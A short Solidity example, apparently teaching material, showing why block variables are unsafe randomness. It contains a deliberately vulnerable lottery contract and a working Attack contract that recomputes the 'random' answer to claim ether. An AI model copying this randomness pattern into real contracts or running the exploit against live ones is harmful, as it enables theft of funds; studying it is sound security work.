// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

/*
* Eventhough block variables are a good source of randomness for humans,
* other contracts can easily manipulate block variables.
* Hence using block variables for randomness in not a good practice.
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
